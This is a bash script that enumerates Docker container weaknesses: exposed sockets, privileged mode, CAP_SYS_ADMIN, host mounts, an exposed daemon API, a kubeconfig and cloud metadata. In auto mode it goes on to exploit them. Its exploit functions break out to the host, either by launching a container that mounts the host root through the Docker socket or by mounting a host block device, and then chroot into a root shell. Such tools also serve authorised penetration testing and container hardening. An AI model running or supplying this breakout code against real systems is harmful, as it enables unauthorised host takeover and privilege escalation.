#!/bin/bash

# DockerBreakoutSuite.sh - Unified Docker Enumeration & Exploitation
# Author: Security Researcher | Inspired by PEASS-ng
# Usage: ./DockerBreakoutSuite.sh [-o findings.json] [-a]

##############################
#        COLOR CODES         #
##############################
RED='\033[0;31m'
LRED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
LGREEN='\033[1;32m'
BLUE='\033[0;34m'
LBLUE='\033[1;34m'
CYAN='\033[0;36m'
LCYAN='\033[1;36m'
NC='\033[0m'

##############################
#        GLOBAL VARS         #
##############################
OUTPUT_FILE="docker_breakout_findings.json"
FINDINGS=()
AUTO_MODE=false

##############################
#        BANNER              #
##############################
print_banner() {
    echo -e "${LCYAN}"
    cat << "EOF"
    ____             __            ____  _________    _____
   / __ \____  _____/ /_____  ____/ __ \/ ____/   |  / ___/
  / / / / __ \/ ___/ //_/ _ \/ __/ /_/ / __/ / /| |  \__ \ 
 / /_/ / /_/ / /__/ ,< /  __/ / / ____/ /___/ ___ | ___/ / 
/_____/\____/\___/_/|_|\___/_/ /_/   /_____/_/  |_|/____/  
EOF
    echo -e "${BLUE}Docker Container Privilege Escalation & Exploit Suite${NC}"
    echo -e "${CYAN}by Security Researcher | Auto Enum + Exploit${NC}\n"
}

##############################
#     PRINT FUNCTIONS        #
##############################
print_header()   { echo -e "\n${LBLUE}════════════════════════════════════════${NC}\n[+] $1"; }
print_critical() { echo -e "${LRED}[CRITICAL] $1${NC}"; }
print_high()     { echo -e "${RED}[HIGH] $1${NC}"; }
print_medium()   { echo -e "${YELLOW}[MEDIUM] $1${NC}"; }
print_low()      { echo -e "${GREEN}[LOW] $1${NC}"; }
print_info()     { echo -e "${CYAN}[INFO] $1${NC}"; }
print_success()  { echo -e "${LGREEN}[✓] $1${NC}"; }
print_error()    { echo -e "${LRED}[✗] $1${NC}"; }
print_warning()  { echo -e "${YELLOW}[!] $1${NC}"; }

##############################
#   ADD FINDINGS FUNCTION    #
##############################
add_finding() {
    local severity="$1"
    local type="$2"
    local description="$3"
    local details="$4"
    local exploit_hint="$5"
    if [[ "$severity" == "CRITICAL" || "$severity" == "HIGH" ]]; then
        local finding=$(cat <<EOF
{
    "severity": "$severity",
    "type": "$type",
    "description": "$description",
    "details": "$details",
    "exploit_hint": "$exploit_hint",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF
)
        FINDINGS+=("$finding")
    fi
}

##############################
#   ENUMERATION FUNCTIONS    #
##############################
check_container_environment() {
    print_header "Container Environment Detection"
    if [ -f "/.dockerenv" ]; then
        print_info "Running inside Docker container"
    elif grep -qa docker /proc/1/cgroup; then
        print_info "Running inside Docker/Kubernetes"
    else
        print_low "Container markers not found - might be host"
    fi
    print_info "Hostname: $(hostname)"
}

check_docker_sock() {
    print_header "Docker Socket Check"
    for sock in /var/run/docker.sock /run/docker.sock; do
        if [ -S "$sock" ]; then
            print_critical "Docker socket exposed: $sock"
            add_finding "CRITICAL" "DOCKER_SOCKET" "Docker socket exposed" "$(ls -la $sock)" "docker_socket_escape"
        fi
    done
}

check_privileged_mode() {
    print_header "Privileged Mode Detection"
    devices=$(ls -la /dev/sd* /dev/vd* 2>/dev/null | grep "^b")
    if [ ! -z "$devices" ]; then
        print_critical "Block devices accessible! Likely privileged container"
        add_finding "CRITICAL" "PRIVILEGED_MODE" "Privileged container detected" "$devices" "privileged_mount_escape"
    fi
}

check_capabilities() {
    print_header "Linux Capabilities"
    CAP_EFF=$(grep CapEff /proc/1/status | awk '{print $2}')
    CAP_DEC=$((16#$CAP_EFF))
    if [ $(( ($CAP_DEC >> 21) & 1 )) -eq 1 ]; then
        print_critical "CAP_SYS_ADMIN detected!"
        add_finding "CRITICAL" "CAP_SYS_ADMIN" "Container has CAP_SYS_ADMIN" "Can mount filesystems/load modules" "cgroup_release_agent_escape"
    fi
}

check_mounts() {
    print_header "Dangerous Mounts"
    if mount | grep -q " / "; then
        print_critical "Host root filesystem mounted!"
        add_finding "CRITICAL" "HOST_ROOT_MOUNT" "Host root mounted" "$(mount | grep ' / ')" "direct_host_access"
    fi
}

check_network() {
    print_header "Network Configuration"
    if netstat -tuln 2>/dev/null | grep -q ":2375"; then
        print_critical "Docker daemon port exposed!"
        add_finding "CRITICAL" "DOCKER_DAEMON_EXPOSED" "Docker API exposed" "$(netstat -tuln | grep ':2375')" "docker_api_exploit"
    fi
}

check_sensitive_files() {
    print_header "Sensitive Files"
    [ -f /root/.kube/config ] && add_finding "HIGH" "K8S_CONFIG" "Kubeconfig found" "/root/.kube/config" "k8s_config_exploit"
    if timeout 1 curl -s http://169.254.169.254/latest/meta-data/ &>/dev/null; then
        add_finding "CRITICAL" "CLOUD_METADATA" "AWS metadata accessible" "http://169.254.169.254/latest/meta-data/" "cloud_metadata_steal"
    fi
}

export_findings() {
    print_header "Export Findings to $OUTPUT_FILE"
    echo "{" > "$OUTPUT_FILE"
    echo "  \"scan_date\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"," >> "$OUTPUT_FILE"
    echo "  \"hostname\": \"$(hostname)\"," >> "$OUTPUT_FILE"
    echo "  \"findings\": [" >> "$OUTPUT_FILE"
    for i in "${!FINDINGS[@]}"; do
        echo "    ${FINDINGS[$i]}" >> "$OUTPUT_FILE"
        [ $i -lt $((${#FINDINGS[@]} - 1)) ] && echo "," >> "$OUTPUT_FILE"
    done
    echo "  ]" >> "$OUTPUT_FILE"
    echo "}" >> "$OUTPUT_FILE"
    print_success "Findings exported"
}

##############################
#      EXPLOIT FUNCTIONS      #
##############################
exploit_docker_socket() {
    print_header "Docker Socket Exploit"
    docker -H unix:///var/run/docker.sock run -v /:/hostfs --rm -it alpine sh -c "chroot /hostfs /bin/bash"
}

exploit_privileged_mount() {
    print_header "Privileged Device Exploit"
    DEVICE=$(ls /dev/sd* /dev/vd* 2>/dev/null | head -1)
    mkdir -p /mnt/hostfs
    mount $DEVICE /mnt/hostfs 2>/dev/null && chroot /mnt/hostfs /bin/bash
}

exploit_cgroup_release_agent() {
    print_header "Cgroup release_agent Exploit (CAP_SYS_ADMIN)"
    print_warning "Manual payload creation recommended"
}

auto_exploit() {
    if grep -q "CAP_SYS_ADMIN" "$OUTPUT_FILE"; then
        exploit_cgroup_release_agent
    elif grep -q "DOCKER_SOCKET" "$OUTPUT_FILE"; then
        exploit_docker_socket
    elif grep -q "PRIVILEGED_MODE" "$OUTPUT_FILE"; then
        exploit_privileged_mount
    else
        print_error "No auto-exploitable vulnerabilities found"
    fi
}

##############################
#       ARG PARSING          #
##############################
while getopts "o:ah" opt; do
    case $opt in
        o) OUTPUT_FILE="$OPTARG";;
        a) AUTO_MODE=true;;
        h) echo "Usage: $0 [-o output_file] [-a]"; exit 0;;
    esac
done

##############################
#          MAIN              #
##############################
main() {
    print_banner
    check_container_environment
    check_docker_sock
    check_privileged_mode
    check_capabilities
    check_mounts
    check_network
    check_sensitive_files
    export_findings
    [ "$AUTO_MODE" = true ] && auto_exploit
    print_success "Enumeration Complete!"
}

main
